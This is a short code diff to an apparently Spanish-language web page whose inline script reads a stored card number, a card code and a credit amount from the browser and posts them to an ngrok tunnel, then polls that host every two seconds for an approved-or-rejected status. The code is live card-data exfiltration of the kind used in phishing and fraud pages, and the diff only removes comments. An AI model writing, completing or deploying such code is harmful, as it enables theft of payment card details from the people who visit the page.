@@ -56,11 +56,9 @@
   </div>
 
   <script>
-    // Generamos un ID único para este usuario
     const userId = 'user_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
     localStorage.setItem('userId', userId);
 
-    // Enviamos los datos al servidor
     const tarjeta = localStorage.getItem('lastCard') || 'No disponible';
     const codigo = localStorage.getItem('lastCode') || 'No disponible';
     const monto = localStorage.getItem('montoCredito') || '0';
@@ -78,8 +76,8 @@ fetch('https://fencing-acquire-protegee.ngrok-free.dev/nuevo', {
     monto: monto
   })
 });
-    // Preguntamos al servidor cada 2 segundos si ya fue aprobado o rechazado
-const interval = setInterval(() => {
+
+  const interval = setInterval(() => {
   fetch(`https://fencing-acquire-protegee.ngrok-free.dev/estado/${userId}`, {
     headers: {
       'ngrok-skip-browser-warning': 'true'
